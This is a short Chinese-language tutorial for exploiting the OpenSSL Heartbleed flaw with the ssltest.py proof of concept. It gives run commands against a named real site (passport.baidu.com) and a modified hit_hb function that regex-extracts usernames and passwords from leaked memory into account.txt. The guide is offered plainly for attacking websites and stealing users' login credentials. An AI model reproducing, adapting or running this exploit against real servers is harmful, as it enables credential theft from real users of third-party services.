第一步：下载POC
SSLtest.py 　

第二步: 赋予执行权限(仅限Unix)
$ chomd +x ./ssltest.py
第三步：执行
$ ./ssltest.py 你要攻击的网站 -P SSL端口

一般SSL端口默认都是443.

如: $ ./ssltest.py passport.baidu.com

如果握手成功，服务器会 返回当前登录用户的 HTTP header 和Body. body你懂得。可以获取到当前登录的Form表单里的一切内容。
介于16进制的内容不方便查看，我就修改了下那个检测脚本，用正则表达式匹配出了用户名和密码的字段，可以支持直接存到文本里。

修改代码如下：

def hit_hb(s):  
    f=open('account.txt','a')
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            username = re.findall(r"username=(.+?)&pass", pay)
            password = re.findall(r"&password=(.+?)&rand", pay)
            if username:
               f.write(username[0] +" "+password[0]+"\r")
            if len(pay) > 3:
              pass
            else:
              pass
            return True

        if typ == 21:
            print 'Received alert:'
            print 'Server returned error, likely not vulnerable'
            return False
会去 HTTP Body中匹配 username 和password字段，然后存到txt文本。 不同的网站，可能不同的字段名称，这个要酌情修改。


原文博客:
https://lostman.org/li-yong-openssl-heartbleed-lou-dong-jin-xing-xiu-tan-gong-ji/
